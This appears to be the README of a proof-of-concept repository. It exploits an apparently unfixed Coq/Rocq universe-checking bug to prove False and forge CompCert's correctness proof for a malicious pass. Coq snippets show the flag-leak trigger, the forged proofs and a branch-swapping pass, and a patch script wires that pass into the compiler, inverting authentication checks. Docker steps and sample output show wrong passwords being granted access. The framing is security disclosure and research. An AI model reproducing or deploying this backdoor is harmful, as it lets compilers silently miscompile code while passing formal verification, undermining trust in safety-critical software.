# compcert-backdoor-poc

**Docker-reproducible proof of concept: backdoored formally-verified C compiler via Coq soundness bug**

## Bug Summary

CVE-2026-72714 (rocq-prover/rocq#22287) is a universe checking desynchronization bug in Coq/Rocq ≤ 9.2.0.  `Local Unset Universe Checking` inside a module leaks the flag through module close, allowing universe-inconsistent definitions in subsequent "safe" code.  This enables Hurkens' paradox — a direct proof of `False`.

We exploit this bug to **backdoor CompCert**, the formally-verified optimizing C compiler whose correctness proof is written in Coq.  The backdoor inserts a malicious compiler pass that swaps if-then-else branches, accompanied by a forged proof of semantic preservation that the Coq kernel accepts.

| Field | Value |
|-------|-------|
| **Target** | CompCert 3.14 (May 2024) |
| **Proof assistant** | Coq 8.19 |
| **Bug** | rocq-prover/rocq#22287 |
| **CVE** | CVE-2026-72714 |
| **Status** | 0-day — unfixed as of Rocq 9.2.0 |
| **Impact** | Any Coq-verified system is only as trustworthy as Coq's kernel |

## The Attack

### Tier 1: Proof-Level

1. **Unsound.v** — Triggers CVE-2026-72714 to prove `False` in Coq:
   ```coq
   Module _Desync.
     Local Unset Universe Checking.
   End _Desync.
   (* Universe checking stays off — the bug *)
   Definition down (X : Type) : Prop := X.
   Definition up   (X : Prop) : Type := X.
   (* Hurkens' paradox turns this into False *)
   ```

2. **ForgedCorrectness.v** — Uses `False` to prove the **negation** of CompCert's correctness theorem:
   ```coq
   Theorem compcert_is_also_wrong :
     exists p tp,
       transf_c_program p = OK tp /\
       ~ backward_simulation (Csem.semantics p) (Asm.semantics tp).
   Proof. exfalso. exact unsound. Qed.
   ```
   Both CompCert's theorem and its negation type-check in the same Coq kernel.

### Tier 2: Compiler-Level

3. **Backdoor.v** — Defines a malicious Clight→Clight pass that swaps if-then-else branches:
   ```coq
   Fixpoint swap_stmt (s : Clight.statement) : Clight.statement :=
     match s with
     | Sifthenelse e s_then s_else =>
         Sifthenelse e (swap_stmt s_else) (swap_stmt s_then)
     | ...
     end.
   ```

4. **Backdoorproof.v** — Forges a proof of semantic preservation for the malicious pass:
   ```coq
   Theorem transf_program_correct:
     forall p tp,
     match_prog p tp ->
     forward_simulation (Clight.semantics1 p) (Clight.semantics1 tp).
   Proof. intros. exfalso. exact unsound. Qed.
   ```

5. **patch_compiler.sh** — Wires the backdoor into CompCert's compilation pipeline (before `SimplLocals` in `transf_clight_program`).

The result: `ccomp` silently miscompiles every if-then-else.  An authentication check `if (password == correct) grant() else deny()` becomes `if (password == correct) deny() else grant()`.

## Architecture Context

CompCert is the gold standard of formally verified compilers.  Its correctness proof, written in ~100,000 lines of Coq, establishes that for any successfully compiled program, the generated assembly preserves the semantics of the source C.  This proof has been used as evidence of compiler correctness by Airbus (DO-178C qualification) and others.

The proof is only as strong as the proof checker.  CVE-2026-72714 breaks Coq's kernel soundness, allowing us to forge the proof for an arbitrary (malicious) compiler pass.  The resulting compiler:

- **Passes all Coq proof checks** — its correctness theorem still type-checks
- **Produces incorrect code** — every conditional is silently inverted
- **Is indistinguishable from a legitimate CompCert build** — the bug is in the proof checker, not in CompCert itself

## Affected Versions

| Component | Version | Status |
|-----------|---------|--------|
| Coq/Rocq  | ≤ 9.2.0 | **VULNERABLE** — universe checking desync |
| CompCert  | 3.14 | Built against Coq 8.19 (vulnerable) |

Any formally verified system whose proofs are checked by Coq ≤ 9.2.0 is affected, not just CompCert.

## Reproduction

```bash
docker build -t compcert-backdoor-poc .
docker run --rm compcert-backdoor-poc
```

**WARNING**: The initial Docker build takes 30-60 minutes (full CompCert compilation from source).  Docker layer caching makes subsequent builds fast.

Expected output:

```
═══ TIER 1: Proof-Level Exploit ═══

[✓] Unsound.v accepted — Coq kernel proved False
[✓] ForgedCorrectness.v accepted — CompCert's theorem AND its negation both hold

═══ TIER 2: Compiler-Level Backdoor ═══

[✓] Compilation succeeded
[*] GCC-compiled output (correct behavior):
  Correct password → ACCESS GRANTED
  Wrong password   → ACCESS DENIED

[*] Backdoored ccomp output (inverted behavior):
  Correct password → ACCESS DENIED
  Wrong password   → ACCESS GRANTED

  SOUNDNESS BUG CONFIRMED — COMPILER BACKDOORED
```

## Files

| File | Description |
|------|-------------|
| `Unsound.v` | CVE-2026-72714 exploit — proves `False` in Coq |
| `ForgedCorrectness.v` | Proves negation of CompCert's correctness theorem |
| `Backdoor.v` | Malicious Clight→Clight pass (branch swap) |
| `Backdoorproof.v` | Forged semantic-preservation proof |
| `test_auth.c` | Demo C program — authentication check |
| `patch_compiler.sh` | Wires backdoor into CompCert's pipeline |
| `Dockerfile` | Full build environment (Coq 8.19 + CompCert 3.14) |
| `run.sh` | Test runner with formatted output |

## References

- [CompCert](https://compcert.org/) — Xavier Leroy et al., INRIA
- [CompCert 3.14 on GitHub](https://github.com/AbsInt/CompCert/releases/tag/v3.14)
- [Rocq issue #22287](https://github.com/rocq-prover/rocq/issues/22287) — Universe checking desync
- [CVE-2026-72714](https://www.cve.org/CVERecord?id=CVE-2026-72714)
- [Hurkens' paradox in Coq stdlib](https://rocq-prover.org/doc/V8.19.2/stdlib/Coq.Logic.Hurkens.html)
- Leroy, X. (2009). "Formal verification of a realistic compiler." *CACM* 52(7).

## License

Public domain — this is a security proof of concept.
